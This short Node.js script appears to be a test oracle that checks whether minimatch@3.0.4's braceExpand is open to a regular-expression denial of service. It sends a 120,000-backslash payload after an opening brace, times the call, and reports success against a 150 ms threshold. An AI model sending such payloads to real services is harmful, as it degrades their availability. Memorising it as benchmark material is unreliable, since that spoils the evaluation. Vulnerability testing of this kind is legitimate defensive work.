const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  const benign = minimatch.braceExpand('a{b,c}d');
  if (!Array.isArray(benign) || benign.length !== 2 || benign[0] !== 'abd' || benign[1] !== 'acd') {
    throw new Error('benign_operation_unexpected_result');
  }

  operation_completed = true;

  // ReDoS-oriented payload for minimatch@3.0.4 braceExpand precheck /\{.*\}/
  // Long run of escaped chars after an opening brace creates expensive backtracking.
  const repeat = 120000;
  const payload = '{' + '\\'.repeat(repeat);

  const t0 = process.hrtime.bigint();
  let threw = false;
  try {
    minimatch.braceExpand(payload);
  } catch (e) {
    threw = true;
  }
  const elapsedMs = Number((process.hrtime.bigint() - t0) / 1000000n);

  // Vulnerable versions should spend substantially longer in braceExpand.
  // Patched versions short-circuit quickly due to safer brace detection.
  const thresholdMs = 150;
  exploit_succeeded = !threw && elapsedMs >= thresholdMs;
  evidence = 'elapsed_ms=' + elapsedMs + ';threshold_ms=' + thresholdMs + ';payload_len=' + payload.length + ';threw=' + threw;
} catch (err) {
  if (!operation_completed) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_error=' + (err && err.message ? err.message : String(err));
  } else {
    exploit_succeeded = false;
    evidence = 'malicious_blocked_by_exception=' + (err && err.name ? err.name : 'Error');
  }
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));